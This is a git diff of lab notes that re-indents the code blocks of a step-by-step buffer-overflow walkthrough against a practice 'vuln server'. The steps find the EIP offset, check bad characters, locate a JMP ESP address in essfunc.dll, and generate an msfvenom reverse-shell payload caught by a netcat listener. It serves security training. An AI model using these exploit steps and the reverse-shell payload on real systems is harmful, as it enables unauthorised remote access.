@@ -766,21 +766,21 @@ It’s basically a wrapper around the OpenAI API.
   - Third step is Finding Offset using findoff.py and creating pattern for finding offset(using python script):
     - we get offset here = offset means The point where EIP gets overwritten  
     - run as administrator for vuln server and immunity debugger
-  ```console
-   //before finding offset you have create a pattern
-      /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400
-  ``` 
+    ```console
+        //before finding offset you have create a pattern
+        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400
+    ``` 
     - copy the pattern of 10400 bytes whatever you want you can create and paste it in findoff.py
-  ```console 
-      pluma findoff.py
-      chmod +x findoff.py
-      ./findoff.py     
-  ```
+    ```console 
+        pluma findoff.py
+        chmod +x findoff.py
+        ./findoff.py     
+    ```
     - In the Immunity Debugger window, you can observe that the EIP register is overwritten with random bytes. Note down the random bytes in the EIP and find the offset of those byte
     - sudo su in new terminal and cd for root directory
-  ```console
-      /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q 386F4337
-  ```
+    ```console
+        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q 386F4337
+    ```
     - -q = query
     - -l = length
     - you will get offset of that bytes
@@ -788,10 +788,10 @@ It’s basically a wrapper around the OpenAI API.
   - Fourth step is Overwrite EIP using overwrite.py:
     - using this method we make sure over EIP offset is correct or not
     - run as administrator for vuln server and immunity debugger
-  ```console 
-      chmod +x overwrite.py 
-      ./overwrite.py
-  ```
+    ```console 
+        chmod +x overwrite.py 
+        ./overwrite.py
+    ```
     - switch to the Windows 11 machine. You can observe that the EIP register is overwritten and EIP is showing as 42424242 
     - now we conform our offset is correct 
     - now we can go to control the EIP 
@@ -799,10 +799,10 @@ It’s basically a wrapper around the OpenAI API.
   - Fifth step is identify bad characters(because they may cause issues in the shellcode):
     - bad char might be stop our payloads also     
     - run as administrator for vuln server and immunity debugger 
-  ```console  
-      chmod -x badchars.py
-      ./badchars.py
-  ```    
+    ```console  
+        chmod -x badchars.py
+        ./badchars.py
+    ```    
     - In Immunity Debugger, click on the ESP register value -->right click on ESP and Follow in Dump option
     - ofter this there is not bad charectors
   
@@ -816,38 +816,38 @@ It’s basically a wrapper around the OpenAI API.
 
   - Seventh step is converted using converter.py(we get Hex code):
     - run as administrator for vuln server and immunity debugger
-  ```console  
-      sudo su
-      cd 
-      python3 /home/attacker/converter.py  
-      Enter the assembly code here : JMP ESP
-    //you will get Hex code
-      !mona find -s "\xff\xe4" -m essfunc.dll
-    //you get the return address of the vulnerable module  
-  ```  
+    ```console  
+        sudo su
+        cd 
+        python3 /home/attacker/converter.py  
+        Enter the assembly code here : JMP ESP
+      //you will get Hex code
+        !mona find -s "\xff\xe4" -m essfunc.dll
+      //you get the return address of the vulnerable module  
+    ```  
     - In the Immunity Debugger window, click the Go to address in Disassembler icon and Enter expression to follow option and enter the return address in that box
 
   - Eigth step is jump usng jump.py
     - we can use this for jump from EIP to ESP
     - EIP register has been overwritten with the return address of the vulnerable module
-  ```console
-      chmod +x jump.py
-      ./jump.py
-  ```
+    ```console
+        chmod +x jump.py
+        ./jump.py
+    ```
 
   - Nighth Step is shell code method using shell code method:
    - first we have to create shell code using msfvenom(metasploit)
-  ```console 
-   - msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00 
-  ```
+    ```console 
+        msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00 
+    ```
    - copy that shell code and paste that code into the shellcode.py
-  ```console 
-      pluma shellcode.py
-     //we will run the Netcat command to listen on port in another terminal
-      nc -nvlp <host_port>
-      chmod +x shellcode.py (in first terminal)
-      ./shellcode.py
-  ```       
+    ```console 
+        pluma shellcode.py
+      //we will run the Netcat command to listen on port in another terminal
+        nc -nvlp <host_port>
+        chmod +x shellcode.py (in first terminal)
+        ./shellcode.py
+    ```       
    - in listening port terminal shell access to the target vulnerable server has been established
 </detals>
 
